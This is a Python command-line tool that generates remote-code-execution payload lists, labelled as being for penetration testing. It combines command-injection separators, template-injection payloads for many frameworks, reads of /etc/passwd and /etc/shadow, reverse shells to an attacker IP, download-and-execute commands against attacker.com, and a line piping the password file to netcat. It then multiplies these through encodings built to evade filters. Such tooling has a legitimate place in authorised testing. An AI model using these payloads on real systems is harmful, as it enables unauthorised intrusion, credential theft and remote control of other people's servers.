import argparse
import urllib.parse
import base64
import random
import string
import codecs
import logging
import sys
from typing import Dict, List, Set, Callable, Any, Iterator
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("rce_generator.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class RCEPayloadGenerator:
    def __init__(self, attacker_ip: str = "192.168.1.100", attacker_domain: str = "attacker.com"):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        self.setup_components()
        
    def setup_components(self):
        """Initialize all payload components"""
        # Context-specific wrappers for different injection points
        self.contexts = {
            "html": {"prefix": "", "suffix": ""},
            "attribute": {"prefix": "\"", "suffix": "\""},
            "javascript": {"prefix": "';", "suffix": ";//"},
            "sql": {"prefix": "';", "suffix": "-- "},
            "php": {"prefix": "<?php ", "suffix": "?>"},
            "unix_shell": {"prefix": "", "suffix": ""},
            "windows_cmd": {"prefix": "", "suffix": ""},
            "powershell": {"prefix": "", "suffix": ""},
        }

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "php": [".", ";"],
            "javascript": [";", ","],
        }

        # Sink-specific constraints (forbidden chars, requirements)
        self.sink_constraints: Dict[str, Dict[str, Any]] = {
            # General OS command sinks
            "unix_os_command": {"forbidden_chars": [";", "|", "&", "`", "(", ")"], "requires_quotes": False},
            "windows_os_command": {"forbidden_chars": ["&", "|", "^", "<", ">"], "requires_quotes": False},
            # Node.js sinks
            "nodejs_child_process_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "nodejs_pug_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            "nodejs_ejs_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            "nodejs_handlebars_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # Python sinks
            "python_os_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "python_jinja2_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # PHP sinks
            "php_exec_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Java sinks
            "java_runtime_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "java_freemarker_ssti": {"forbidden_chars": ["${", "}"], "requires_quotes": False},
            "java_velocity_ssti": {"forbidden_chars": ["#", "$"], "requires_quotes": False},
            "java_thymeleaf_ssti": {"forbidden_chars": ["[[", "]]"], "requires_quotes": False},
            # .NET sinks
            "dotnet_process_start": {"forbidden_chars": ["&", "|"], "requires_quotes": True},
            # Ruby sinks
            "ruby_kernel_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "ruby_erb_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            # Perl sinks
            "perl_system_backticks": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Go sinks
            "go_os_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
        }

        # Common payloads by category, now with sink-level granularity in code_execution
        self.payload_categories = {
            "basic_enum": {
                "unix": ["id", "whoami", "uname -a", "pwd", "ls -la", "ps aux"],
                "windows": ["whoami", "ver", "dir", "tasklist", "ipconfig"],
            },
            "file_operations": {
                "unix": [
                    "cat /etc/passwd", "cat /etc/shadow", 
                    "head -n 10 /etc/passwd", "tail -f /var/log/syslog",
                    "find / -name '*.conf' -type f 2>/dev/null"
                ],
                "windows": [
                    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "dir C:\\Windows\\System32\\drivers\\etc",
                    "dir C:\\Users"
                ],
            },
            "network_operations": {
                "unix": ["ifconfig", "netstat -tulpn", "arp -a", "ping -c 4 127.0.0.1"],
                "windows": ["ipconfig /all", "netstat -ano", "arp -a", "ping -n 4 127.0.0.1"],
            },
            "code_execution": {
                "nodejs": {
                    "child_process_exec": [
                        "require('child_process').exec('whoami')",
                        "require('child_process').exec('cat /etc/passwd | nc {attacker_ip} 443')",
                        "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"')",
                    ],
                    "pug_ssti": [
                        "= 7 * 7",
                        "= require('child_process').exec('whoami')",
                    ],
                    "ejs_ssti": [
                        "<%= 7 * 7 %>",
                        "<%= require('child_process').exec('whoami') %>",
                    ],
                    "handlebars_ssti": [
                        "{{7 * 7}}",
                        "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}",  # Simplified example
                    ],
                },
                "python": {
                    "os_system": [
                        "os.system('whoami')",
                        "os.system('cat /etc/passwd')",
                        "os.system('bash -i >& /dev/tcp/{attacker_ip}/443 0>&1')",
                    ],
                    "subprocess": [
                        "subprocess.call(['whoami'], shell=True)",
                        "subprocess.Popen('cat /etc/passwd', shell=True).communicate()",
                    ],
                    "jinja2_ssti": [
                        "{{7*7}}",
                        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
                        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
                    ],
                },
                "php": {
                    "exec_system": [
                        "system('whoami')",
                        "exec('whoami')",
                        "shell_exec('whoami')",
                        "passthru('whoami')",
                        "eval('system(\"whoami\")')",
                        "preg_replace('/.*/e','system(\"whoami\")','')",  # Legacy /e modifier
                    ],
                },
                "java": {
                    "runtime_exec": [
                        "Runtime.getRuntime().exec(\"whoami\")",
                        "new ProcessBuilder(\"whoami\").start()",
                        "Runtime.getRuntime().exec(\"cat /etc/passwd\")",
                    ],
                    "freemarker_ssti": [
                        "${7*7}",
                        "${'freemarker.template.utility.Execute'?new()('id')}",
                        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}",
                    ],
                    "velocity_ssti": [
                        "#set($x='') $x",
                        "#set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $d=$ex.getInputStream() $d=$chr.toChars($d.readBytes($d.available())) $out=$str.valueOf($d) $out",
                    ],
                    "thymeleaf_ssti": [
                        "[[${7*7}]]",
                        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
                    ],
                },
                "dotnet": {
                    "process_start": [
                        "Process.Start(\"whoami.exe\")",
                        "Process.Start(\"cmd.exe\", \"/c whoami\")",
                        "new Process { StartInfo = new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = \"/c whoami\" } }.Start()",
                    ],
                },
                "ruby": {
                    "kernel_system": [
                        "system('whoami')",
                        "`whoami`",
                        "Kernel.system('whoami')",
                        "Kernel.exec('whoami')",
                    ],
                    "erb_ssti": [
                        "<%= 7 * 7 %>",
                        "<%= `whoami` %>",
                        "<%= File.open('/etc/passwd').read %>",
                    ],
                },
                "perl": {
                    "system_backticks": [
                        "system('whoami')",
                        "`whoami`",
                        "exec('whoami')",
                    ],
                },
                "go": {
                    "os_exec": [
                        "exec.Command(\"whoami\").Output()",
                        "exec.Command(\"bash\", \"-c\", \"whoami\").Output()",
                        "exec.Command(\"cat\", \"/etc/passwd\").Output()",
                    ],
                },
                "javascript": [  # Legacy, kept for compatibility
                    "require('child_process').exec('whoami')",
                    "eval(\"require('child_process').exec('whoami')\")"
                ],
            },
            "download_execute": {
                "unix": [
                    "curl http://{attacker_domain}/shell.sh | sh",
                    "wget http://{attacker_domain}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
                    "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://{attacker_domain}/shell.py').read())\""
                ],
                "windows": [
                    "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_domain}/shell.ps1')\"",
                    "certutil -urlcache -f http://{attacker_domain}/shell.exe shell.exe && shell.exe"
                ],
            },
            "reverse_shells": {
                "unix": [
                    "bash -i >& /dev/tcp/{attacker_ip}/443 0>&1",
                    "nc -e /bin/sh {attacker_ip} 443",
                    "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{attacker_ip}\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'"
                ],
                "windows": [
                    "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()\""
                ],
            },
        }

        # Encoding and obfuscation techniques
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "rot13": lambda x: codecs.encode(x, 'rot13'),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            "insert_special_chars": lambda x: self.insert_special_chars(x, 0.1),
        }

    def insert_special_chars(self, s: str, frequency: float = 0.1) -> str:
        """Insert special characters randomly"""
        special_chars = ['%00', '%0a', '%0d', '%09', '%20', '%0b', '%0c']
        result = []
        for char in s:
            if random.random() < frequency:
                result.append(random.choice(special_chars))
            result.append(char)
        return ''.join(result)

    def apply_constraints(self, payload: str, sink: str) -> str:
        """Apply sink-specific constraints to payload"""
        if sink not in self.sink_constraints:
            return payload
        
        constraints = self.sink_constraints[sink]
        forbidden = constraints.get('forbidden_chars', [])
        
        # Simple replacement for forbidden chars (e.g., encode them)
        for char in forbidden:
            if char in payload:
                # Replace with URL-encoded version as example
                payload = payload.replace(char, urllib.parse.quote(char))
        
        if constraints.get('requires_quotes', False):
            payload = f'"{payload}"'
        
        return payload

    def generate_payloads(self, selected_contexts: List[str] = None, 
                         selected_categories: List[str] = None,
                         selected_encodings: List[str] = None,
                         selected_environments: List[str] = None) -> Iterator[str]:
        """
        Generate RCE payloads based on selected options
        
        Args:
            selected_contexts: List of contexts to include (default: all)
            selected_categories: List of categories to include (default: all)
            selected_encodings: List of encoding methods to apply (default: all)
            selected_environments: List of environments to include (default: all)
            
        Yields:
            Generated payload strings
        """
        generated_payloads: Set[str] = set()
        
        # Use all if none specified
        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
        environments = selected_environments if selected_environments else ["unix", "windows", "nodejs", "python", "php", "java", "dotnet", "ruby", "perl", "go", "javascript"]
        
        logger.info(f"Generating payloads for contexts: {contexts}, categories: {categories}, "
                   f"encodings: {encodings}, environments: {environments}")
        
        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning(f"Unknown context: {context_name}")
                continue
                
            context = self.contexts[context_name]
            
            for category_name in categories:
                if category_name not in self.payload_categories:
                    logger.warning(f"Unknown category: {category_name}")
                    continue
                    
                category = self.payload_categories[category_name]
                
                for env in environments:
                    if env not in category:
                        continue
                    
                    env_payloads = category[env]
                    if isinstance(env_payloads, dict):  # For code_execution with sinks
                        for sink, payloads in env_payloads.items():
                            sink_key = f"{env}_{sink.replace('.', '_')}"  # Normalize sink key for constraints
                            for base_payload in payloads:
                                constrained_payload = self.apply_constraints(base_payload, sink_key)
                                for wrapped_payload in self._generate_variations(constrained_payload, context, env, encodings, generated_payloads):
                                    yield wrapped_payload
                    else:  # For other categories
                        for base_payload in env_payloads:
                            for wrapped_payload in self._generate_variations(base_payload, context, env, encodings, generated_payloads):
                                yield wrapped_payload

    def _generate_variations(self, base_payload: str, context: Dict, env: str, encodings: List[str], generated_payloads: Set[str]) -> Iterator[str]:
        """Helper to generate payload variations with separators and encodings"""
        formatted_payload = base_payload.replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
        
        # Add with separators
        if env in self.separators:
            for sep in self.separators[env]:
                full_payload = f"{sep}{formatted_payload}"
                for wrapped_payload in self._encode_and_wrap(full_payload, context, encodings, generated_payloads):
                    yield wrapped_payload
        
        # Add without separator
        for wrapped_payload in self._encode_and_wrap(formatted_payload, context, encodings, generated_payloads):
            yield wrapped_payload

    def _encode_and_wrap(self, payload: str, context: Dict, encodings: List[str], generated_payloads: Set[str]) -> Iterator[str]:
        """Apply encodings and context wrapping"""
        for enc_name in encodings:
            if enc_name not in self.encoding_methods:
                continue
                
            try:
                enc_func = self.encoding_methods[enc_name]
                encoded_payload = enc_func(payload)
                
                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                
                if wrapped_payload not in generated_payloads:
                    generated_payloads.add(wrapped_payload)
                    yield wrapped_payload
            except Exception as e:
                logger.error(f"Error encoding payload: {e}")

    def save_payloads_to_file(self, file_path: str, max_payloads: int = None, **kwargs) -> int:
        """
        Generate payloads and save them to a file
        
        Args:
            file_path: Path to the output file
            max_payloads: Maximum number of payloads to generate (None for unlimited)
            **kwargs: Arguments to pass to generate_payloads
            
        Returns:
            Number of payloads generated
        """
        count = 0
        try:
            with open(file_path, "w") as file:
                for payload in self.generate_payloads(**kwargs):
                    file.write(payload + "\n")
                    count += 1
                    if max_payloads and count >= max_payloads:
                        break
                        
            logger.info(f"Successfully generated {count} payloads to {file_path}")
        except Exception as e:
            logger.error(f"Error writing to file {file_path}: {e}")
            
        return count

def main():
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("-o", "--output", default="rce_payloads.txt", 
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate (default: all)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: all)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = RCEPayloadGenerator(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain
    )
    
    # Generate and save payloads
    count = generator.save_payloads_to_file(
        file_path=args.output,
        max_payloads=args.max_payloads,
        selected_contexts=args.contexts,
        selected_categories=args.categories,
        selected_encodings=args.encodings,
        selected_environments=args.environments
    )
    
    print(f"Generated {count} payloads to {args.output}")

if __name__ == "__main__":
    main()